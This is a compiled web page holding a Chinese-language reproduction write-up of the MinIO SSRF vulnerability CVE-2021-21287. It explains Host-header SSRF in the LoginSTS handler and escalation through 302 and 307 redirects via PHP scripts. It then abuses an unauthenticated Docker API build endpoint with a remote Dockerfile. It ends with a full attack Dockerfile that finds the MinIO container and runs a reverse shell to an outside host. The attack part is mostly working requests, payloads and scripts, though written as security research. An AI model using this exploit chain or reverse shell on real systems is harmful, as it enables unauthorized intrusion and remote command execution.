import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as p,c,a as n,b as a,d as e,e as t}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),r={href:"https://min.io/",target:"_blank",rel:"noopener noreferrer"},d=n("p",null,"参考阅读：",-1),k={href:"https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html",target:"_blank",rel:"noopener noreferrer"},m=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MinIO
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>既然我们选择了从MinIO入手，那么先了解一下MinIO。其实我前面也说了，因为平时用到MinIO的时候很多，所以这一步可以省略了。其使用Go开发，提供HTTP接口，而且还提供了一个前端页面，名为“MinIO Browser”。当然，前端页面就是一个登陆接口，不知道口令无法登录。</p><p>那么从入口点（前端接口）开始对其进行代码审计吧。</p><p>在User-Agent满足正则<code>.*Mozilla.*</code>的情况下，我们即可访问MinIO的前端接口，前端接口是一个自己实现的JsonRPC：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091232124.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们感兴趣的就是其鉴权的方法，随便找到一个RPC方法，可见其开头调用了<code>webRequestAuthenticate</code>，跟进看一下，发现这里用的是jwt鉴权：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091232341.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>jwt常见的攻击方法主要有下面这几种：</p><ul><li><p>将alg设置为None，告诉服务器不进行签名校验</p></li><li><p>如果alg为RSA，可以尝试修改为HS256，即告诉服务器使用公钥进行签名的校验</p></li><li><p>爆破签名密钥</p></li></ul><p>查看MinIO的JWT模块，发现其中对alg进行了校验，只允许以下三种签名方法：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091232648.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这就堵死了前两种绕过方法，爆破当然就更别说了，通常仅作为没办法的情况下的手段。当然，MinIO中使用用户的密码作为签名的密钥，这个其实会让爆破变地简单一些。</p><p>鉴权这块没啥突破，我们就可以看看，有哪些RPC接口没有进行权限验证。</p><p>很快找到了一个接口，<code>LoginSTS</code>。这个接口其实是AWS STS登录接口的一个代理，用于将发送到JsonRPC的请求转变成STS的方式转发给本地的9000端口（也就还是他自己，因为它是兼容AWS协议的）。</p><p>简化其代码如下：</p><div class="language-go line-numbers-mode" data-ext="go"><pre class="language-go"><code><span class="token comment">// LoginSTS - STS user login handler.</span>
<span class="token keyword">func</span> <span class="token punctuation">(</span>web <span class="token operator">*</span>webAPIHandlers<span class="token punctuation">)</span> <span class="token function">LoginSTS</span><span class="token punctuation">(</span>r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">,</span> args <span class="token operator">*</span>LoginSTSArgs<span class="token punctuation">,</span> reply <span class="token operator">*</span>LoginRep<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>
    ctx <span class="token operator">:=</span> <span class="token function">newWebContext</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token string">&quot;WebLoginSTS&quot;</span><span class="token punctuation">)</span>

    v <span class="token operator">:=</span> url<span class="token punctuation">.</span>Values<span class="token punctuation">{</span><span class="token punctuation">}</span>
    v<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">&quot;Action&quot;</span><span class="token punctuation">,</span> webIdentity<span class="token punctuation">)</span>
    v<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">&quot;WebIdentityToken&quot;</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>Token<span class="token punctuation">)</span>
    v<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">&quot;Version&quot;</span><span class="token punctuation">,</span> stsAPIVersion<span class="token punctuation">)</span>

    scheme <span class="token operator">:=</span> <span class="token string">&quot;http&quot;</span>
    <span class="token comment">// ...</span>

    u <span class="token operator">:=</span> <span class="token operator">&amp;</span>url<span class="token punctuation">.</span>URL<span class="token punctuation">{</span>
        Scheme<span class="token punctuation">:</span> scheme<span class="token punctuation">,</span>
        Host<span class="token punctuation">:</span>   r<span class="token punctuation">.</span>Host<span class="token punctuation">,</span>
    <span class="token punctuation">}</span>

    u<span class="token punctuation">.</span>RawQuery <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">Encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    req<span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">NewRequest</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>MethodPost<span class="token punctuation">,</span> u<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>没发现有鉴权上的绕过问题，但是发现了另一个有趣的问题。这里，MinIO为了将请求转发给“自己”，就从用户发送的HTTP头Host中获取到“自己的地址”，并将其作为URL的Host构造了新的URL。</p><p>这个过程有什么问题呢？</p><p>因为请求头是用户可控的，所以这里可以构造任意的Host，进而构造一个SSRF漏洞。</p><p>我们来实际测试一下，向<code>http://192.168.227.131:9000</code>发送如下请求，其中Host的值是我本地ncat开放的端口（<code>192.168.1.142:4444</code>）：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /minio/webrpc HTTP/1.1
Host: 192.168.1.142:4444
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Content-Type: application/json
Content-Length: 80

{&quot;id&quot;:1,&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;params&quot;:{&quot;token&quot;:  &quot;Test&quot;},&quot;method&quot;:&quot;web.LoginSTS&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功收到请求：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091232269.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以确定这里存在一个SSRF漏洞了。</p><p>仔细观察，可以发现这是一个POST请求，但是Path和Body都没法控制，我们能控制的只有URL中的一个参数<code>WebIdentityToken</code>。</p><p>但是这个参数经过了URL编码，无法注入换行符等其他特殊字符。这样就比较鸡肋了，如果仅从现在来看，这个SSRF只能用于扫描端口。我们的目标当然不仅限于此。</p><p>幸运的是，Go默认的http库会跟踪302跳转，而且不论是GET还是POST请求。所以，我们这里可以302跳转来“升级”SSRF漏洞。</p><p>使用PHP来简单地构造一个302跳转：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Location: http://192.168.1.142:4444/attack?arbitrary=params&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>将其保存成index.php，启动一个PHP服务器：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091232095.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将Host指向这个PHP服务器。这样，经过一次302跳转，我们收获了一个可以控制完整URL的GET请求：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091233803.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>放宽了一些限制，结合前面我对这套内网的了解，我们可以尝试攻击Docker集群的2375端口。</p><p>2375是Docker API的接口，使用HTTP协议通信，默认不会监听TCP地址，这里可能是为了方便内网其他机器使用所以开放在内网的地址里了。那么，我们是否可以通过SSRF来攻击这个接口呢？</p>`,37),g=n("code",null,"docker run",-1),h=n("code",null,"docker exec",-1),b={href:"http://blog.neargle.com/SecNewsBak/drops/%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker",target:"_blank",rel:"noopener noreferrer"},v=n("code",null,"POST /containers/create",-1),f=n("code",null,"POST /containers/{id}/exec",-1),S=n("p",null,"两个API都是POST请求，而我们可以构造的SSRF却是一个GET的。怎么办呢？",-1),q=n("p",null,"还记得我们是怎样获得这个GET型的SSRF的吗？通过302跳转，而接受第一次跳转的请求就是一个POST请求。不过我们没法直接利用这个POST请求，因为他的Path不可控。",-1),T=n("p",null,"如何构造一个Path可控的POST请求呢？",-1),_={href:"https://tools.ietf.org/html/rfc7231#page-58",target:"_blank",rel:"noopener noreferrer"},I=t(`<div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent MUST NOT change the request method if it performs an automatic redirection to that URI.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>307跳转的特点就是<strong>不会</strong>改变原始请求的方法，也就是说，在服务端返回307状态码的情况下，客户端会按照Location指向的地址发送一个相同方法的请求。</p><p>我们正好可以利用这个特性，来获得POST请求。</p><p>简单修改一下之前的index.php：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Location: http://192.168.1.142:4444/attack?arbitrary=params&#39;</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token number">307</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>尝试SSRF击，收到了预期的请求：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091233552.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Bingo，获得了一个POST请求的SSRF，虽然没有Body。</p><p>回到Docker API，我发现现在仍然没法对run和exec两个API做利用，原因是，这两个API都需要在请求Body中传输JSON格式的参数，而我们这里的SSRF无法控制Body。</p>`,9),P={href:"https://docs.docker.com/engine/api/v1.41/#operation/ImageBuild",target:"_blank",rel:"noopener noreferrer"},x=t(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091233674.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这个API的大部分参数是通过Query Parameters传输的，我们可以控制。阅读其中的选项，发现它可以接受一个名为<code>remote</code>的参数，其说明为：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file’s contents are placed into a file called Dockerfile and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the dockerfile parameter is also specified, there must be a file with the corresponding path inside the tarball.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这个参数可以传入一个Git地址或者一个HTTP URL，内容是一个Dockerfile或者一个包含了Dockerfile的Git项目或者一个压缩包。</p><p>也就是说，Docker API支持通过指定远程URL的方式来构建镜像，而不需要我在本地写入一个Dockerfile。</p><p>所以，我尝试编写了这样一个Dockerfile，看看是否能够build这个镜像，如果可以，那么我的4444端口应该能收到wget的请求：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>FROM alpine:3.13
RUN wget -T4 http://192.168.1.142:4444/docker/build
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后修改前面的index.php，指向Docker集群的2375端口：</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>&lt;?php
header(&#39;Location: http://192.168.227.131:2375/build?remote=http://192.168.1.142:4443/Dockerfile&amp;nocache=true&amp;t=evil:1&#39;, false, 307);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>进行SSRF攻击，等待了一会儿，果然收到请求了：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091233874.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>完美，我们已经可以在目标集群容器里执行任意命令了。</p><p>此时离我们的目标，拿下MinIO，还差一点点，后面的攻击其实就比较简单了。</p><p>因为现在可以执行任意命令，我们就不会再受到SSRF漏洞的限制，可以直接反弹一个shell，或者可以直接发送任意数据包到Docker API，来访问容器。经过一顿测试，我发现MinIO虽然是运行的一个service，但实际上就只有一个容器。</p><p>所以我编写了一个自动化攻击MinIO容器的脚本，并将其放在了Dockerfile中，让其在Build的时候进行攻击，利用<code>docker exec</code>在MinIO的容器里执行反弹shell的命令。这个Dockerfile如下：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>FROM alpine:3.13

RUN apk <span class="token function">add</span> <span class="token function">curl</span> <span class="token function">bash</span> jq

RUN <span class="token builtin class-name">set</span> <span class="token parameter variable">-ex</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\\</span>
    <span class="token punctuation">{</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;#!/bin/bash&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;set -ex&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;target=&quot;http://192.168.227.131:2375&quot;&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;jsons=$(curl -s -XGET &quot;\${target}/containers/json&quot; | jq -r &quot;.[] | @base64&quot;)&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;for item in \${jsons[@]}; do&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;    name=$(echo $item | base64 -d | jq -r &quot;.Image&quot;)&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;    if [[ &quot;$name&quot; == *&quot;minio/minio&quot;* ]]; then&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;        id=$(echo $item | base64 -d | jq -r &quot;.Id&quot;)&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;        break&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;    fi&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;done&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;execid=$(curl -s -X POST &quot;\${target}/containers/\${id}/exec&quot; -H &quot;Content-Type: application/json&quot; --data-binary &quot;{\\&quot;Cmd\\&quot;: [\\&quot;bash\\&quot;, \\&quot;-c\\&quot;, \\&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.142/4444 0&gt;&amp;1\\&quot;]}&quot; | jq -r &quot;.Id&quot;)&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
        <span class="token builtin class-name">echo</span> <span class="token string">&#39;curl -s -X POST &quot;\${target}/exec/\${execid}/start&quot; -H &quot;Content-Type: application/json&quot; --data-binary &quot;{}&quot;&#39;</span><span class="token punctuation">;</span> <span class="token punctuation">\\</span>
    <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token function">bash</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个脚本所干的事情比较简单，一个是遍历了所有容器，如果发现其镜像的名字中包含<code>minio/minio</code>，则认为这个容器就是MinIO所在的容器。拿到这个容器的Id，用exec的API，在其中执行反弹shell的命令</p>`,17),R={href:"https://www.youtube.com/embed/WyDEn0wUhPc",target:"_blank",rel:"noopener noreferrer"},O=n("p",null,"当然，我们也可以通过Docker API来获取集群权限",-1);function w(y,A){const s=i("ExternalLinkIcon");return p(),c("div",null,[u,n("p",null,[a("随着工作和生活中的一些环境逐渐往云端迁移，对象存储的需求也逐渐多了起来，"),n("a",r,[a("MinIO"),e(s)]),a("就是一款支持部署在私有云的开源对象存储系统。MinIO完全兼容AWS S3的协议，也支持作为S3的网关，所以在全球被广泛使用，在Github上已有25k star。MinIO中存在SSRF漏洞，通过漏洞可以获取敏感信息或远程命令执行")]),d,n("ul",null,[n("li",null,[n("a",k,[a("https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html"),e(s)])])]),m,n("p",null,[a("在Docker未授权访问的情况下，我们通常可以使用"),g,a("或"),h,a("来在目标容器里执行任意命令（如果你不了解，可以参考[这篇文章]("),n("a",b,[a("http://blog.neargle.com/SecNewsBak/drops/新姿势之Docker"),e(s)]),a(" Remote API未授权访问漏洞分析和利用.html)）。但是翻阅Docker的文档可知，这两个操作的请求是"),v,a("和"),f,a("。")]),S,q,T,n("p",null,[a("我想到了307跳转，307跳转是在"),n("a",_,[a("RFC 7231"),e(s)]),a("中定义的一种HTTP状态码，描述如下：")]),I,n("p",null,[a("继续翻越Docker文档，我发现了另一个API，"),n("a",P,[a("Build an image"),e(s)]),a("：")]),x,n("p",null,[n("a",R,[a("Youtube 演示链接"),e(s)])]),O])}const L=o(l,[["render",w],["__file","MinIO SSRF 漏洞 CVE-2021-21287.html.vue"]]);export{L as default};
